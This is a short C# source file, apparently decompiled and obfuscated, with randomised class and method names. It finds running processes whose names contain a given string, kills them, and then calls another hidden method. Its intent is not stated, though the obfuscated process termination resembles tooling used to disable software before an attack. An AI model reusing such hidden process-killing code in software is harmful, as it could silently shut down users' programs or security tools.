using System;
using System.Diagnostics;

namespace RshJmeUGgeNp;

public sealed class XJctdXRvuhfFV
{
	public static bool UOzupQSYgBHa(Process process_0, string string_0)
	{
		try
		{
			return process_0.ProcessName.ToLower().Contains(string_0.ToLower());
		}
		catch (InvalidOperationException)
		{
			return false;
		}
		catch (NullReferenceException)
		{
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void OYKYrxuJEDSg(string string_0, string string_1)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (UOzupQSYgBHa(process, string_0.ToLower()))
			{
				try
				{
					process.Kill();
					process.WaitForExit();
					RvpNXHMAnDGj.fdRBVCGmbW();
				}
				catch (InvalidOperationException)
				{
				}
				catch (PlatformNotSupportedException)
				{
					break;
				}
				catch
				{
				}
			}
		}
	}
}
